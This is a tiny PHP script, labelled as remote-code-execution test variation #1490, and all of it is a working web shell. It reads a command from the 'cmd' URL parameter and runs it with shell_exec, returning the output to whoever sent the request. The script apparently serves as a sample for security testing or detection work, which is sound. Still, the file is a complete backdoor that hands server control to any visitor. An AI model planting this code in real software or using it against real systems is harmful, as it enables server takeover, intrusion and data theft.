<?php
// RCE test variation #1490
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>